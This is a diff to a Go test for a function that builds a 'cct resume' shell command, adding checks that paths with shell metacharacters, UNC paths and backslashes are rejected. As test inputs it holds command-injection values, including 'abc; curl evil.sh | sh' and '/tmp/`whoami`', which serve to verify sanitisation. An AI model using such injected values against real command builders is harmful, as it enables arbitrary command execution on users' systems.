@@ -40,8 +40,9 @@ func TestResumeFallbackCommand(t *testing.T) {
 			t.Errorf("ordinary home %q was rejected", home)
 			continue
 		}
-		if !strings.Contains(command, id) || !strings.Contains(command, `--codex-home "`+home+`"`) {
-			t.Errorf("command = %q", command)
+		want := `cct resume ` + id + ` --run --codex-home "` + home + `"`
+		if command != want {
+			t.Errorf("command = %q, want exact rendering %q", command, want)
 		}
 	}
 
@@ -52,6 +53,8 @@ func TestResumeFallbackCommand(t *testing.T) {
 		"/tmp/`whoami`",
 		`C:\Users\%USERNAME%\.codex`,
 		"C:\\trailing\\",
+		`\\server\share\.codex`,
+		`/tmp/double\\backslash`,
 		"/tmp/new\nline",
 	} {
 		if command, ok := ResumeFallbackCommand(id, home); ok {
@@ -60,6 +63,16 @@ func TestResumeFallbackCommand(t *testing.T) {
 	}
 	if command, ok := ResumeFallbackCommand("abc; curl evil.sh | sh", "/tmp/codex"); ok {
 		t.Errorf("unsafe thread ID produced command %q", command)
+	}
+}
+
+func TestResumeFallbackCommandRejectsCrossShellMetacharacters(t *testing.T) {
+	const id = "aaaaaaaa-1111-4111-8111-111111111111"
+	for _, r := range []rune{'"', '\'', '`', '$', ';', '&', '|', '<', '>', '(', ')', '%', '!', '^'} {
+		home := "/tmp/codex" + string(r) + "home"
+		if command, ok := ResumeFallbackCommand(id, home); ok {
+			t.Errorf("shell metacharacter %q in home produced command %q", r, command)
+		}
 	}
 }
 
